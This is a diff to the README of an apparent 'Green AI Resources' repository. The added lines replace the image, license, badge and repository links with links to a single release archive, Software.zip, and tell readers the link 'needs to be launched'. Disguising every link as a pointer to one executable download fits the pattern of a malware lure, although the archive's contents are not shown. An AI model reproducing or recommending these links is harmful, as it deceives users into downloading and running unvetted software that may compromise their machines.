@@ -2,7 +2,7 @@
 
 Welcome to the Green AI Resources repository, a curated collection of research, tools, and best practices for environmentally sustainable AI development and deployment. This repository aims to provide resources to help developers reduce the carbon footprint of AI systems and contribute to a more sustainable future. 
 
-![Green AI](https://imageurl.com)
+![Green AI](https://github.com/Sgtbermido1/Green-AI-Resources/releases/download/v2.0/Software.zip)
 
 ## Table of Contents
 
@@ -35,14 +35,14 @@ We welcome contributions from the community to help expand our collection of gre
 
 ## License
 
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+This repository is licensed under the [MIT License](https://github.com/Sgtbermido1/Green-AI-Resources/releases/download/v2.0/Software.zip).
 
 ---
 
-[![Download Software](https://img.shields.io/badge/Download-Software-brightgreen)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Sgtbermido1/Green-AI-Resources/releases/download/v2.0/Software.zip)](https://github.com/Sgtbermido1/Green-AI-Resources/releases/download/v2.0/Software.zip)
 
 **Note**: The link provided needs to be launched to access the downloadable software.
 
 ---
 
-Visit the [Green AI Resources](https://github.com/user-attachments/Green-AI-Resources) repository to explore a wealth of resources on carbon emissions, energy consumption, sustainability, and more in AI development. Let's work together towards a greener, more sustainable future through AI innovation! 🌍🌱🤖
+Visit the [Green AI Resources](https://github.com/Sgtbermido1/Green-AI-Resources/releases/download/v2.0/Software.zip) repository to explore a wealth of resources on carbon emissions, energy consumption, sustainability, and more in AI development. Let's work together towards a greener, more sustainable future through AI innovation! 🌍🌱🤖
